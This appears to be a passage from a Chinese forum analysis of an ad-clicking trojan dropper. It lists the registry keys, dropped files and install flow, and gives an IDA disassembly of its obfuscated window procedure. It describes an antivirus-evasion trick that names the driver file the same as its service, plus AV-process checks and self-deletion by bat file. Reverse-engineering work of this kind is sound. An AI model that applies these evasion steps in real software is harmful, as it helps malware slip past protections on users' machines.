
文件尾加`0x100`个字节随机数，见小弟的`IDB`中标示的`ReleaseTrjan()`这个函数。

关注一下关键形为：

## 关注一下关键行为

### 注册表操作部分：

查询`HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main`键`Start Page`的值

写入`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\DateTime`键`Index`，值为`1`(实际上是选择的网址的索引值)

### 文件部分：

释放

- `%temp%\opundg.exe`
- `%temp%\szdthm.exe` (这个文件已经不是PE了)
- `%temp%\dbpqesj.bat`
- `%temp%\sokzyn.bat`

### 网络部分：

连接`7efK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6e0p5K6z5e0p5K6z5g2)9J5k6h3W2F1k6X3!0Q4x3V1k6Z5j5h3!0Q4x3X3g2H3K9s2m8Q4c8e0c8Q4b7U0S2Q4z5p5u0Q4c8e0S2Q4b7V1c8Q4b7V1c8Q4c8e0k6Q4z5e0k6Q4z5o6N6Q4c8e0c8Q4b7V1u0Q4b7U0k6Q4c8e0g2Q4z5o6S2Q4b7U0m8Q4x3U0g2@1k6h3#2H3i4K6t1#2i4K6g2o6M7%4A6V1N6r3S2E0i4K6u0W2k6i4S2W2`

## 第2部分：接下来分析释放出来的`opundg.exe`

### 亮点技术：

利用驱动文件名和服务名一样，并且在`drivers`目录下的时候，不需要写`ImagePath`，从而躲过主动防御！

### 关于驱动：

驱动分等级的。

- `boot`的有`ntldr`加载。
- `win32k.sys`由`smss.exe`加载。
- 一般的由`services.exe`加载。

### 这一部分操作的主要流程：

1. 解密字符串
2. 安装木马并运行
   - 2-1、通过`LoadLibrary`, `GetProcAddress`动态获取`ToolHelp32Api`(`CreateTolHelp32SnapShot`、`Process32First`, `Process32Next`)
   - 2-2、判断`AVP.EXE`进程是否存在
     - 2-2-1、解密字符串
     - 2-2-2、判断驱动`ksdrv`是否安装，未安装则如下进行：
       - 2-2-2-1、产生随机名
       - 2-2-2-2、释放DLL文件`%SYSTEMROOT%\Sytem32`下，如果存在360，则将文件的句柄拷贝到`explorer`进程中(居然不用`system`占坑?) 更新释放的文件的日期
       - 2-2-2-3、释放`sys`文件到`%SYSTEMROOT%\System32\Drivers`下。
3. 进行IE的一些操作，刷广告(作者似乎对`ce0K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8W2)9J5b7e0p5I4z5q4)9J5k6g2)9J5b7g2!0q4z5q4!0n7c8W2)9&6z5g2!0q4y4W2!0m8x3q4!0n7y4#2!0q4y4g2!0m8c8q4)9&6y4#2!0q4y4W2!0m8x3q4!0n7y4#2!0q4y4#2)9&6b7g2)9^5y4q4!0q4y4#2!0n7c8q4)9&6x3g2!0q4y4g2)9&6c8q4)9^5x3q4!0q4y4q4!0n7z5q4)9^5c8q4!0q4y4W2!0n7b7W2!0m8x3g2!0q4y4g2)9&6y4g2)9^5b7g2!0q4c8W2!0n7b7#2)9^5b7#2!0q4z5g2)9^5x3g2)9^5y4#2!0q4y4g2)9^5z5q4!0n7x3q4!0q4y4q4!0n7b7g2)9^5y4W2!0q4y4g2!0n7x3q4!0n7x3g2!0q4y4g2!0m8c8g2)9^5b7#2!0q4y4g2)9^5y4g2!0m8z5q4!0q4y4g2)9^5x3g2)9&6b7#2!0q4y4W2!0m8c8q4!0m8x3W2!0q4y4g2!0n7y4#2!0m8y4g2!0q4y4q4!0n7c8q4)9&6b7#2!0q4y4q4!0n7b7g2)9^5y4W2)9J5z5g2!0q4c8W2!0n7b7#2)9^5b7H3`).

   创建`iexplorer.exe`进程，然后枚举窗口，然利用COM接口操作(`RegisterWindowMessageA(WM_GET_OBJECT)`、`ObjectFromLresult`)

4. 进行清除操作，`bat`大法删除自己。

解密的字符串如下图：

![](https://bbs.kanxue.com/upload/attach/201202/447582_xwmifsv4xs4kxiu.jpg)

我们来看一下关键的处理函数：

```
.text:00401AA0     ; int __stdcall MyWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)

.text:00401AA0     MyWndProc       proc near               ; DATA XREF: sub_403190+1Eo

.text:00401AA0

.text:00401AA0     hWnd            = dword ptr  8

.text:00401AA0     Msg             = dword ptr  0Ch

.text:00401AA0     wParam          = dword ptr  10h

.text:00401AA0     lParam          = dword ptr  14h

.text:00401AA0

.text:00401AA0 000                 push    ebp

.text:00401AA1 004                 mov     ebp, esp

.text:00401AA3 004                 mov     eax, [ebp+Msg]

.text:00401AA6 004                 push    ebx

.text:00401AA7 008                 push    esi

.text:00401AA8 00C                 dec     eax

.text:00401AA9 00C                 push    edi

.text:00401AAA 010                 jnz     short loc_401B1F

.text:00401AAC 010                 pushaw

.text:00401AAE 020                 push    ecx

.text:00401AAF 024                 test    bl, ah

.text:00401AB1 024                 or      ch, 47h

.text:00401AB4 024                 pop     ecx

.text:00401AB5 020                 popaw

.text:00401AB7 010                 call    near ptr DecodeAllStr

.text:00401ABC 010                 jz      short loc_401ACB

.text:00401ABE 010                 mov     di, di

.text:00401AC1 010                 mov     edx, edx

.text:00401AC3 010                 xchg    ebx, ebx

.text:00401AC5 010                 jnz     short loc_401ACB

.text:00401AC5     ; ---------------------------------------------------------------------------

.text:00401AC7 010 unk_401AC7      db 0C8h ; ?

.text:00401AC8 010                 db  1Bh

.text:00401AC9 010                 db  5Eh ; ^

.text:00401ACA 010                 db  11h

.text:00401ACB     ; ---------------------------------------------------------------------------

.text:00401ACB

.text:00401ACB     loc_401ACB:                             ; CODE XREF: MyWndProc+1Cj

.text:00401ACB                                             ; MyWndProc+25j

.text:00401ACB 010                 call    near ptr TorjanSetUp

.text:00401AD0 00E                 pusha

.text:00401AD1 02E                 sub     ebx, 0E88h

.text:00401AD7 02E                 test    ecx, esi

.text:00401AD9 02E                 dec     ch

.text:00401ADB 02E                 test    bh, 2Ah

.text:00401ADE 02E                 or      ah, 12h

.text:00401AE1 02E                 sub     bh, dh

.text:00401AE3 02E                 or      ax, ax

.text:00401AE6 02E                 or      al, 2Fh

.text:00401AE8 02E                 cmp     ch, 5

.text:00401AEB 02E                 popa

.text:00401AEC 00E                 call    Control_IE

.text:00401AF1 00E                 push    eax

.text:00401AF2 012                 test    eax, 7CBDh

.text:00401AF7 012                 sub     ah, bl

.text:00401AF9 012                 cmp     eax, 2AEDh

.text:00401AFE 012                 add     ah, 4Dh

.text:00401B01 012                 and     eax, 26AEh

.text:00401B06 012                 dec     ax

.text:00401B08 012                 pop     eax

.text:00401B09 00E                 mov     eax, g_bFinish

.text:00401B0E 00E                 test    eax, eax

.text:00401B10 00E                 jnz     short loc_401B1F

.text:00401B12 00E                 push    0               ; nExitCode

.text:00401B14 012                 call    ds:PostQuitMessage

.text:00401B1A 00E                 call    CleanRubish

.text:00401B1F

.text:00401B1F     loc_401B1F:                             ; CODE XREF: MyWndProc+Aj

.text:00401B1F                                             ; MyWndProc+70j

.text:00401B1F 00E                 mov     eax, [ebp+lParam]

.text:00401B22 00E                 mov     ecx, [ebp+wParam]

.text:00401B25 00E                 mov     edx, [ebp+Msg]

.text:00401B28 00E                 push    eax             ; lParam

.text:00401B29 012                 mov     eax, [ebp+hWnd]

.text:00401B2C 012                 push    ecx             ; wParam

.text:00401B2D 016                 push    edx             ; Msg

.text:00401B2E 01A                 push    eax             ; hWnd

.text:00401B2F 01E                 call    ds:DefWindowProcA

.text:00401B35 00E                 pop     edi

.text:00401B36 00A                 pop     esi

.text:00401B37 006                 pop     ebx

.text:00401B38 002                 pop     ebp

.text:00401B39 000                 retn    10h

.text:00401B39     MyWndProc       endp ; sp-analysis failed
```

猥缩的刷广告的操作实现如下：
